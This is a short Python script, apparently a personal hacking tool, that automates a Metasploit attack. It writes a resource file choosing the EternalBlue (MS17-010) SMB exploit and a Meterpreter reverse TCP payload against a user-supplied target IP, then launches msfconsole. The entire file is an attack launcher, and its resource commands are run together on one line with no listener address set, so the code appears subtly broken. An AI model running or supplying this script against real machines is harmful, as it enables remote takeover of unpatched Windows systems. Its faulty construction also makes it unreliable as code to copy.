#flemme de faire l'instalation de metasploit windows je ferais plsu tard

import subprocess

class metasploit :
    def __init__(self):
        pass

    def run(self):
        exploit_name = "windows/smb/ms17_010_eternalblue"
        payload_name = "windows/meterpreter/reverse_tcp"
        target_ip = input("What is the target IP ?")
        try :
            msf_script = f"""use {exploit_name} set RHOSTS {target_ip} set PAYLOAD {payload_name} exploit"""
            with open("msf_script.rc","w") as file:
                file.write(msf_script)
            print("Launching Metasploit ...")
            subprocess.run(["msfconsole","-q","-r","msf_script.rc"])
            
        except Exception as e:
            print(f"Error {e}")

ga = metasploit()
ga.run()